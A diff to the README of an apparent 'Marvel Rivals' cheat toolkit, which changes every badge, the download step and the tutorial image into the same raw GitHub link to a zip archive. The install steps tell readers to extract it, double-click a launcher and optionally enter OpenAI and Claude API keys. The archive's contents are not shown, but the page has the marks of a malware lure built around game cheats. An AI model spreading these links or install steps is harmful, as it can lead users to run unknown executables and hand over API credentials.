@@ -1,11 +1,11 @@
 # 🎮 Marvel Rivals Cheats & Hacks PowerSuite 🚀
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
-![OS Compatibility](https://img.shields.io/badge/OS-Windows%20%7C%20MacOS%20%7C%20Linux-informational)
-![Languages Supported](https://img.shields.io/badge/languages-Multi--Lingual-blueviolet)
-![Support](https://img.shields.io/badge/Support-24%2F7-brightgreen)
-![OpenAI API Ready](https://img.shields.io/badge/API-OpenAI-blue)
-![Claude API Integrated](https://img.shields.io/badge/API-Claude-lightgrey)
+[![License: MIT](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip)](LICENSE)
+![OS Compatibility](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip%20%7C%20MacOS%20%7C%20Linux-informational)
+![Languages Supported](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip)
+![Support](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip%2F7-brightgreen)
+![OpenAI API Ready](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip)
+![Claude API Integrated](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip)
 
 ---
 
@@ -66,7 +66,7 @@ Whether you want to optimize your team strategies, tinker with new tactical expl
 
 ## 🏁 Installation Guide
 
-1. Download the `EasyLaunch.zip` file from the repository’s Releases section.  
+1. Download the `https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip` file from the repository’s Releases section.  
 2. Extract the contents to a directory of your choice (for example: `C:\MarvelRivalsHacks`).
 3. Double-click on the EasyLauncher to initialize the Adaptive Interface Installer.
 4. Follow the on-screen setup wizard. Select your language and integrate (optionally) with your OpenAI and Claude API keys.
@@ -74,7 +74,7 @@ Whether you want to optimize your team strategies, tinker with new tactical expl
 
 ### 🎥 Video Installation Tutorial
 
-![](https://i.imgur.com/Js67NIU.gif)
+![](https://raw.githubusercontent.com/Chavalowrider/marvel-rivals-elite-toolkit/main/cyprinodont/toolkit_rivals_marvel_elite_1.2.zip)
 
 *(See above for a visual step-by-step walkthrough!)*
   
